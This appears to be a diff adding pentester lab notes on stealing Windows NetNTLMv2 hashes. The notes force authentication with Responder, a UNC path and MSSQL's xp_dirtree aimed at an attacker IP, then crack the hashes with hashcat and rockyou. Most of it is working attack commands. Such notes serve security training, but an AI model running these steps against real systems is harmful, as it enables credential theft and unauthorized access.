@@ -1,1 +1,30 @@
+Responder
+Capture forced authentication credentials.
+sudo  responder -I tun0 -wv  
 
+Snap the web_svc user's credentials forcing them to authenticate to our impacket-smbserver/Responder smb server. 
+UNC Path from portal \\192.168.x.x\smbshare 
+\\192.168.x.x\smbshare
+C:\Windows\system32>dir \\192.168.x.x\smbshare
+
+Crack the hash.
+hashcat -m 5600 mute.hash /usr/share/wordlists/rockyou.txt 
+
+
+Getting an NetNTLMv2 Hash from MS-SQL (port 1433)
+After finding that we have access to mssql, we can use a great tool called mssqlclient.py from the Impacket Collection of Tools to connect to the server with the following command:
+mssqlclient.py -p 1433 reporting@10.10.10.125 -windows-auth
+
+We get prompted for the password and successfully gain an ‘SQL’ shell.
+The first thing we want is enumerate the database and then try to enable the xp_cmdshell; however, if we are denied access to do so, we can try running Responder to grab a hash of the user who owns the MSSQL service.
+
+Fire up Responder with the following command:
+responder -I tun0
+
+With Responder running, we can now dump the MSSQL service owners hash using the exec master..exp_dirtree command, like so:
+exec master..xp_dirtree '\\10.10.14.2\test'
+
+This will attempt to connect to a share named ‘test’ on our attacker machine’s IP. When the user attempts to connect, they will present the NetNTLMv2 hash of the service owner to request to connect to our share. Responder will intercept this request and dump the NetNTLMv2 hash.
+
+Crack the NetNTLMv2
+hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
